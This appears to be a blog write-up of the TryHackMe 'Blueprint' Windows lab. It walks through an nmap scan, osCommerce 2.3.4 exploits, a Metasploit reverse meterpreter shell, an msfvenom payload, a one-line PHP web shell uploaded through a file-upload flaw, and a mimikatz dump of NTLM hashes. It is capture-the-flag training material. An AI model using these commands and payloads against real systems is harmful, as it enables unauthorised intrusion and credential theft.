---
layout: project
type: project
image: images/writeups/thm/blueprint/logo.jpeg
title: Blueprint - TryHackMe
permalink: writeups/blueprint
# All dates must be YYYY-MM-DD format!
date: 2021-04-20
labels:
  - TryHackMe
  - boot2root
  - Easy
  - Windows
  - Mimikatz
  - Metasploit
summary: Hack into this Windows machine and escalate your privileges to Administrator.
---

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/blueprint/header.png">
<script src="https://www.tryhackme.com/badge/192700"></script>

```
MACHINE = Blueprint
TARGET = VARIABLE
OS = WINDOWS
DIFFICULTY = EASY
```

## Enumeration

Starting with nmap for a full scan.
The server has Microsoft IIS 7.5 which after some google searching I confirmed to be part of Windows Server 2008 R2

```shell
┌──(root💀Toyin)-[~/infosec/thm/blueprint]
└─# nmap -T4 -A -oN nmap 10.10.90.231
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-31 22:52 WAT
Nmap scan report for blueprint.thm (10.10.90.231)
Host is up (0.43s latency).
Not shown: 987 closed ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Bad request!
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Device type: general purpose|media device
Running (JUST GUESSING): Microsoft Windows 2008|10|7|8.1|2012|Vista (93%), Microsoft embedded (88%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1:r1 cpe:/h:microsoft:xbox_one cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_vista
Aggressive OS guesses: Microsoft Server 2008 R2 SP1 (93%), Microsoft Windows 10 (90%), Microsoft Windows 10 10586 - 14393 (90%), Microsoft Windows 10 1511 (90%), Microsoft Windows 10 1607 (90%), Microsoft Windows 7 or 8.1 R1 (90%), Microsoft Windows 7 Ultimate (90%), Microsoft Windows 7 or 8.1 R1 or Server 2008 R2 SP1 (90%), Microsoft Windows 8.1 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -20m05s, deviation: 34m33s, median: -9s
|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 02:78:37:6a:eb:51 (unknown)
| smb-os-discovery:
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: BLUEPRINT
|   NetBIOS computer name: BLUEPRINT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-03-31T22:54:12+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-03-31T21:54:33
|_  start_date: 2021-03-31T21:25:57

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   3.99 ms  10.8.0.1
2   80.87 ms blueprint.thm (10.10.90.231)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 193.33 seconds
```

Going to the web page on port 8080 I got a page index and some information disclosure for what the web server uses

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/blueprint/1.png">

## Exploitation (Metasploit)

Running searchsploit with the information I found a couple of different vulnerablilities for oscommerce 2.3.4
```shell
┌──(root💀Toyin)-[~/infosec/thm/blueprint]
└─# searchsploit oscommerce 2.3.4
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
osCommerce 2.3.4 - Multiple Vulnerabilities                                                                                                                                                               | php/webapps/34582.txt
osCommerce 2.3.4.1 - 'currency' SQL Injection                                                                                                                                                             | php/webapps/46328.txt
osCommerce 2.3.4.1 - 'products_id' SQL Injection                                                                                                                                                          | php/webapps/46329.txt
osCommerce 2.3.4.1 - 'reviews_id' SQL Injection                                                                                                                                                           | php/webapps/46330.txt
osCommerce 2.3.4.1 - 'title' Persistent Cross-Site Scripting                                                                                                                                              | php/webapps/49103.txt
osCommerce 2.3.4.1 - Arbitrary File Upload                                                                                                                                                                | php/webapps/43191.py
osCommerce 2.3.4.1 - Remote Code Execution                                                                                                                                                                | php/webapps/44374.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Checking  the remote code execution exploit, it seems to only work if the /install/ directory was not removed by the admin
Editing the exploit to fit my parameters and running it I got a success message and a URL to execute the payload

```shell
┌──(root💀Toyin)-[~/infosec/thm/blueprint]
└─# python oscommerce-rce.py
[+] Successfully launched the exploit. Open the following URL to execute your code

http://blueprint.thm:8080/oscommerce-2.3.4/catalog/install/includes/configure.php
```

I got an error so decided to go for the quicker route and check for a metasploit module for it.
I found one, set the options and executed the exploit and got a meterpreter shell as system

```shell
msf6 > search oscommerce

Matching Modules
================

   #  Name                                                      Disclosure Date  Rank       Check  Description
   -  ----                                                      ---------------  ----       -----  -----------
   0  exploit/multi/http/oscommerce_installer_unauth_code_exec  2018-04-30       excellent  Yes    osCommerce Installer Unauthenticated Code Execution
   1  exploit/unix/webapp/oscommerce_filemanager                2009-08-31       excellent  No     osCommerce 2.2 Arbitrary PHP Code Execution


Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/webapp/oscommerce_filemanager

msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > options

Module options (exploit/multi/http/oscommerce_installer_unauth_code_exec):

   Name     Current Setting    Required  Description
   ----     ---------------    --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   10.10.90.231       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'fi
                                         le:<path>'
   RPORT    8080               yes       The target port (TCP)
   SSL      false              no        Negotiate SSL/TLS for outgoing connections
   URI      /oscommerce-2.3.4/catalog/install/  yes       The path to the install directory
   VHOST    blueprint.thm      no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.8.169.153     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   osCommerce 2.3.4.1

msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > run

[*] Started reverse TCP handler on 10.8.169.153:4444
[*] Sending stage (39282 bytes) to 10.10.90.231
[*] Meterpreter session 1 opened (10.8.169.153:4444 -> 10.10.90.231:49489) at 2021-03-31 23:27:27 +0100

meterpreter > getuid
Server username: SYSTEM (0)
```

I then uploaded mimikatz to the target to get the hashes

```shell
meterpreter > upload /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe
[*] uploading  : /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe -> mimikatz.exe
[*] Uploaded -1.00 B of 1020.76 KiB (0.0%): /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe -> mimikatz.exe
[*] uploaded   : /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe -> mimikatz.exe
```

## Exploitation (No Metasploit)

I used msfvenom to generate a windows meterpreter reverse shell

```shell
┌──(root💀Toyin)-[~/infosec/thm/blueprint]
└─# msfvenom -p windows/meterpreter/reverse_tcp lhost=10.8.169.153 lport=4444 -f exe > rev.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
```

I decided to try the Arbitrary File Upload vulnerability found from searchsploit.
It require some form of authentication so i start a new installation and set basic credentials of admin:admin

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/blueprint/2.png">

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/blueprint/3.png">

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/blueprint/4.png">

I then ran the exploit with the credentials and uploaded the meterpreter reverse shell and a php web shell.
For the web shell, system(), exec() and shell_exec() did not work but passthru() did

```shell
┌──(root💀Toyin)-[~/infosec/thm/blueprint]
└─# python2 oscommerce-upload.py -u http://blueprint.thm:8080 -a admin:admin -f rev.exe
[+] Authentication successful
[+] Successfully prepared the exploit and created a new newsletter with nID 1
[+] Successfully locked the newsletter. Now attempting to upload..
[*] Now trying to verify that the file rev.exe uploaded..
[+] Got a HTTP 200 Reply for the uploaded file!
[+] The uploaded file should now be available at http://blueprint.thm:8080/oscommerce-2.3.4/catalog/admin/rev.exe

┌──(root💀Toyin)-[~/infosec/thm/blueprint]
└─#  python2 oscommerce-upload.py -u http://blueprint.thm:8080 -a admin:admin -f shell.php
[+] Authentication successful
[+] Successfully prepared the exploit and created a new newsletter with nID 2
[+] Successfully locked the newsletter. Now attempting to upload..
[*] Now trying to verify that the file shell.php uploaded..
[+] Got a HTTP 200 Reply for the uploaded file!
[+] The uploaded file should now be available at http://blueprint.thm:8080/oscommerce-2.3.4/catalog/admin/shell.php

┌──(root💀Toyin)-[~/infosec/thm/blueprint]
└─# cat shell.php
<?php passthru($_GET['cmd']); ?>

┌──(root💀Toyin)-[~/infosec/thm/blueprint]
└─# curl http://blueprint.thm:8080/oscommerce-2.3.4/catalog/admin/shell.php?cmd=whoami
nt authority\system
```

Using the web shell to execute the meterpreter reverse shell I got a meterpreter shell back on my metasploit listener

```shell
# shell
┌──(root💀Toyin)-[~/infosec/thm/blueprint]
└─# curl http://blueprint.thm:8080/oscommerce-2.3.4/catalog/admin/shell.php?cmd=rev.exe

# metasploit
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.8.169.153     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.8.169.153:4444
[*] Sending stage (175174 bytes) to 10.10.90.231
[*] Meterpreter session 4 opened (10.8.169.153:4444 -> 10.10.90.231:49629) at 2021-04-01 00:32:00 +0100

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

I then went on the get the hashes

```shell
meterpreter > load mimikatz
[!] The "mimikatz" extension has been replaced by "kiwi". Please use this in future.
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.

meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping SAM
Domain : BLUEPRINT
SysKey : 147a48de4a9815d2aa479598592b086f
Local SID : S-1-5-21-3130159037-241736515-3168549210

SAMKey : 3700ddba8f7165462130a4441ef47500

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 549a1bcb88e35dc18c7a0b0168631411

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : Lab
  Hash NTLM: 30e87bf999828446a1c1209ddde4c450

```

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/blueprint/5.png">